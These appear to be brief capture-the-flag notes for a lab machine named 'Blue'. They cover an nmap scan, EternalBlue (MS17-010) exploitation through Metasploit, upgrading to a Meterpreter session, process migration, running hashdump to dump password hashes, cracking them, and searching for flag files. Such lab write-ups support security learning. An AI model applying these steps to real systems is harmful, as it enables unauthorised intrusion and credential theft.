# Blue

- Scanned the machine using nmap 
    ```
    nmap -sC -sV -oN nmap/initial 10.10.1.232
    ```

- Machine is vulnerable to eternal blue exploit (ms17-010)
- Start metasploit
- search for eternalblue and `set <path_to_exploit>`
- `set rhosts <target ip>`
- Run the exploit
- Background the DOS shell
- Now we will escalate this shell using metasploit
- Use `shell_to_mterpreter` post module
- Select the new session for use.
- Now we need to migrate to a process to get a stable connection. First list all the processes using `ps` command. Then migrate using `migrate <pid>`.
- Run `hashdump` to dump all the passwords on the machine
- Crack the hash obtained
- Find the respective flags using `search -f flag*.*`
